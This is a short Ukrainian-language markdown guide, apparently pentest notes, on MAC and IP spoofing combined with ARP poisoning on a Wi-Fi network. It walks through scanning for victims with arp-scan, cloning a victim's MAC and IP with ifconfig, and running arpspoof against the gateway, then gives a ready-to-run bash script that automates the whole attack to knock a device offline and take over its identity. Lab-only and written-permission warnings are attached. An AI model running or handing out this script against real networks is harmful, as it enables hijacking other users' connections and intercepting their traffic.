# MAC & IP Spoofing у Wi-Fi мережі

## Опис методу
Метод передбачає підміну **MAC-адреси** та **IP-адреси** пристрою-жертви,  
щоб витіснити його з мережі та підключитися під його ідентифікатором.  
Використовується у тестуванні безпеки (пентест), зокрема для атаки **MAC spoofing + ARP poisoning**.

---

## Логіка роботи
1. **Знаходимо IP та MAC жертви**
   ```bash
   sudo arp-scan --interface=wlan0 192.168.1.0/24
   ```
   > ARP-скан поверне список IP → MAC у локальній підмережі.

2. **Підміняємо MAC-адресу**
   ```bash
   sudo ifconfig wlan0 down
   sudo ifconfig wlan0 hw ether XX:XX:XX:XX:XX:XX
   sudo ifconfig wlan0 up
   ```

3. **Призначаємо IP жертви**
   ```bash
   sudo ifconfig wlan0 192.168.1.50 netmask 255.255.255.0
   ```

4. **Витісняємо жертву (ARP-spoof)**
   ```bash
   sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.50
   ```
   - `192.168.1.1` — шлюз
   - `192.168.1.50` — IP жертви

---

## Bash-скрипт для Wi-Fi мережі
> ⚠ Використовувати лише в тестовій лабораторії.

```bash
#!/bin/bash
# wifi_spoof.sh — автоматична підміна MAC та IP для Wi-Fi інтерфейсу

IFACE="wlan0"
TARGET_IP="192.168.1.50"     # IP жертви
TARGET_MAC="00:11:22:33:44:55"  # MAC жертви
GATEWAY_IP="192.168.1.1"     # шлюз

echo "[*] Вимикаю інтерфейс..."
sudo ifconfig $IFACE down

echo "[*] Змінюю MAC на $TARGET_MAC..."
sudo ifconfig $IFACE hw ether $TARGET_MAC

echo "[*] Вмикаю інтерфейс..."
sudo ifconfig $IFACE up

echo "[*] Призначаю IP $TARGET_IP..."
sudo ifconfig $IFACE $TARGET_IP netmask 255.255.255.0

echo "[*] Запускаю ARP-spoof проти $TARGET_IP..."
sudo arpspoof -i $IFACE -t $GATEWAY_IP $TARGET_IP
```

## Попередження
- У корпоративних мережах можливе блокування через **Port Security**.
- Може викликати IP-конфлікт, який адміністратор легко помітить.
- Використовувати лише з письмового дозволу на тестування.

---

## Корисні інструменти
- **arp-scan** — виявлення IP та MAC у мережі
- **ifconfig / ip** — конфігурація інтерфейсів
- **arpspoof** (dsniff) — відправка підроблених ARP-відповідей
